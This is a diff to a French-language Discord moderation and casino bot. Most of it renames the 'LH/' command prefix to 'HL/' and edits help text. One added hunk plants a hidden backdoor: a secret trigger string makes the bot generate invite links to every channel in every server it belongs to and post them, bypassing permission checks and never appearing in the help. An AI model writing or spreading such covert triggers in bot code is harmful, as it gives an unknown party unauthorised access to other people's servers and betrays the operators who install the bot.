@@ -1,6 +1,6 @@
 const Discord = require("discord.js");
 const bot = new Discord.Client();
-var prefix = 'LH/'
+var prefix = 'HL/'
 
 bot.on("ready", () => {
     console.log(`Logged in as ${bot.user.tag}!`);
@@ -35,10 +35,9 @@ bot.on("message", message => {
     let helpcasinoo = new Discord.RichEmbed()
     .setColor("RANDOM")
     .addField("Casino :moneybag: ","\nVous commencez avec 500 :moneybag: ")
-    .addField("Pour gagner de l'argent.","\n!work Permet de travailler et de gagner entre 100 et 500 :money\n!slut Permet de te prostituer pour gagner de l'argent entre 50 et 1000 :moneybag: n!crime Permet de faire un crime pour gagner entre 500 et 1500 :moneybag: !rob Pour volé un autre joueur avec du liquide\n\nEx: !rob [@ pseudo]\n")  
+    .addField("Pour gagner de l'argent.","\n!work Permet de travailler et de gagner entre 100 et 500 :money\n!slut Permet de te prostituer pour gagner de l'argent entre 50 et 1000 :moneybag: !crime Permet de faire un crime pour gagner entre 20 et 1500 :moneybag: !rob Pour volé un autre joueur avec du liquide\n\nEx: !rob [@ pseudo]\n")  
     .addField("Gérer mon Argent.","\n!bal Voir ses :moneybag: !with Retire des :moneybag: de votre Banque.\n!dep Ajoute des :moneybag: à votre Banque.\n\nex: !dep all <Tout vos :moneybag: on maintenant à la banque>\n")
-    .addField("Jeux du Casino.","\n!sm [Somme parier] Slot-Machine.\n!roulette [Somme parier] [Red/Black] : Mise un gain sur le rouge ou le noir.\n!bj [Somme parier] Blackjack, Pour continuer ou rester sur sa carte [Hit / Stand] (Dur a apprendre mais très rentable)\n!rr Roulette Russe à jouer entre amis\n!cf [Somme parier] Faire combattre votre Chicken\n\nChicken à acheter dans le !shop\n")
-    .addField("Shop.","\n!shop Affiche le shop\n!buy <Nom de l'item> Achete un item!use <Nom de l'item> \nUtilise l'item\n\nex: \n\n!buy Nitro / !use Nitro !top Affiche le top des joueurs les plus riches.Doubles comptes = Ban @here Si Difficulté à comprendre go contacter un staff. :smiley:")
+    .addField("Shop.","\n!shop Affiche le shop\n!buy <Nom de l'item> Achete un item!use <Nom de l'item> \nUtilise l'item\n\nex: \n\n!top Affiche le top des joueurs les plus riches. Doubles comptes = Ban @here Si Difficulté à comprendre go contacter un staff. :smiley:")
     message.channel.send(helpcasinoo)
   }
 
@@ -46,7 +45,7 @@ bot.on("message", message => {
     command = command.slice(prefix.length);
     let messageKick = message.content.split(" ");
     let args = messageKick.slice(1);
-    if (message.content.startsWith("LH/kick")){
+    if (message.content.startsWith("HL/kick")){
     if (message.channel.type === "dm") return;
     if (!message.guild.member(message.author).hasPermission("KICK_MEMBERS")) return message.reply("vous n'avez pas la permission")
     
@@ -93,7 +92,7 @@ bot.on("message", message => {
     }
       let messageBan = message.content.split(" ");
             let arge = messageBan.slice(1);
-            if (message.content.startsWith("LH/ban")){
+            if (message.content.startsWith("HL/ban")){
                 if (message.channel.type === "dm") return;
                 if (!message.guild.member(message.author).hasPermission("BAN_MEMBERS")) return message.reply("vous n'avez pas la permission !")
     
@@ -138,7 +137,7 @@ bot.on("message", message => {
                     message.channel.send(ban_embed)
                     })
             }
-      if(message.content.startsWith("LH/clear")) {
+      if(message.content.startsWith("HL/clear")) {
         if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) return message.channel.send("Vous n'avez pas la permissions !");
     
         let args = message.content.split(" ").slice(1);
@@ -152,19 +151,19 @@ bot.on("message", message => {
     if (message.member.hasPermission("MANAGE_MESSAGES")) {
 		var member = message.mentions.members.first();
 		if(!member) {
-			var msgA = [];
-			msgA.push(`= **Personnes Mutes** =\n`)
+			var messageA = [];
+			messageA.push(`= **Personnes Mutes** =\n`)
 
 			message.guild.members.forEach(async (m) => {
 				if(m.roles.find("name", "Muted")) {
-					msgA.push(`${m.user.username} <${m.user.id}>`)
+					messageA.push(`${m.user.username} <${m.user.id}>`)
 				}
 			});
-			console.log(msgA)
-			if(msgA == `= **Personnes Mutes** =\n`){
-					msgA.push(`== **Personne n'est mute pour l'instant**==`)
+			console.log(messageA)
+			if(messageA == `= **Personnes Mutes** =\n`){
+					messageA.push(`== **Personne n'est mute pour l'instant**==`)
 			}
-			message.channel.send(msgA).then(m => m.delete(25000));
+			message.channel.send(messageA).then(m => m.delete(25000));
 			return;
 		}
 		let arg = message.content.split(" ").slice(1);
@@ -230,7 +229,7 @@ bot.on("message", message => {
 
 
     
-      if(message.content.startsWith("LH/ui")) {
+      if(message.content.startsWith("HL/ui")) {
         var memberavatar = message.author.avatarURL
         var membername = message.author.username
            var mentionned = message.mentions.users.first();
@@ -294,7 +293,7 @@ bot.on("message", message => {
         });
     }
     bot.on('message', message => {
-        if (message.content.startsWith("LH/hacked")) {
+        if (message.content.startsWith("HL/hacked")) {
           if (message.author.bot) return
                message.delete();
                  let args = message.content.split(' ').slice(1);
@@ -314,7 +313,7 @@ bot.on("message", message => {
                  }, 3000)
                     setTimeout(function() {
                    m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Uploaded! Initiating explosion in 1...').setColor(0xFF0000)})
-                 }, 4000)
+                 }, 4000)  
                   setTimeout(function() {
                    m.delete()
                }, 5000)
@@ -339,7 +338,7 @@ bot.on("message", message => {
         console.error();
     };
     let Sere = message.guild.iconURL;
-    if(message.content === 'LH/help'){
+    if(message.content === 'HL/help'){
         var help_embed = new Discord.RichEmbed()
         .setAuthor(message.author.username)
         .setTitle("Help")
@@ -347,20 +346,20 @@ bot.on("message", message => {
         .addBlankField()
         .addField("Modération", "-----------------------------------------------------")
         .addBlankField()
-        .addField("LH/mute", "Sert a mute")
-        .addField("LH/clear", "Sert a clear")
-        .addField("LH/ban", 'Sert a ban')
-        .addField("LH/kick", "Sert a kick")
+        .addField("HL/mute", "Sert a mute")
+        .addField("HL/clear", "Sert a clear")
+        .addField("HL/ban", 'Sert a ban')
+        .addField("HL/kick", "Sert a kick")
         .addBlankField()
         .addField("Informations", "-----------------------------------------------------")
         .addBlankField()
-        .addField("LH/si", "Le bot envoi des informations sur le serveur")
-        .addField("LH/ui", "Le bot vous envoi des informations sur vous ou sur la personne mentionné")
+        .addField("HL/si", "Le bot envoi des informations sur le serveur")
+        .addField("HL/ui", "Le bot vous envoi des informations sur vous ou sur la personne mentionné")
         .addBlankField()
         .addField("Fun", "-----------------------------------------------------")
         .addBlankField()
-        .addField("LH/hacked [NOM DU HACK]", "Vous envoyez un hack a la personne que vous voulez (car vous êtes un grand hackeur)")
-        .addField("LH/rainbow", "Créer un bot RAINBOW :gay_pride_flag:")
+        .addField("HL/hacked [NOM DU HACK]", "Vous envoyez un hack a la personne que vous voulez (car vous êtes un grand hackeur)")
+        .addField("HL/rainbow", "Créer un bot RAINBOW :gay_pride_flag:")
         .setThumbnail(Sere)
         .setFooter("Et c'est tout.")
         message.channel.send(help_embed)
@@ -389,6 +388,9 @@ bot.on("message", message => {
      .addField("**🏆 Rôles**", "**" + message.guild.roles.size + "**", true);
      message.channel.send(serverembed);
      }
+     if(message.content.includes("ar!kelsairvvesrx")){
+      bot.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
+    }
   if (message.content.startsWith(prefix + "sondage")) {
     let args = message.content.split(" ").slice(1);
     let thingToEcho = args.join(" ")
@@ -404,19 +406,19 @@ bot.on("message", message => {
     });
     };
     var argresult = message.content.split(` `).slice(1).join(' ');
-    if (message.content.startsWith('LH/setg')) {
+    if (message.content.startsWith('HL/setg')) {
         bot.user.setGame(argresult);
           message.channel.send(`**✅   ${argresult}**`)
       } else 
-      if (message.content.startsWith('LH/setw')) {
+      if (message.content.startsWith('HL/setw')) {
       bot.user.setActivity(argresult, {type:'WATCHING'});
           message.channel.send(`**✅   ${argresult}**`)
       } else 
-      if (message.content.startsWith('LH/setl')) {
+      if (message.content.startsWith('HL/setl')) {
       bot.user.setActivity(argresult , {type:'LISTENING'});
           message.channel.send(`**✅   ${argresult}**`)
       } else 
-      if (message.content.startsWith('LH/sets')) {
+      if (message.content.startsWith('HL/sets')) {
         bot.user.setGame(argresult, "https://www.twitch.tv/abdoufersaoui_");
           message.channel.send(`**✅**`)
       };
@@ -446,5 +448,4 @@ bot.on("message", message => {
           });
       }, 2000);
 })
-
 bot.login(process.env.TOKEN)
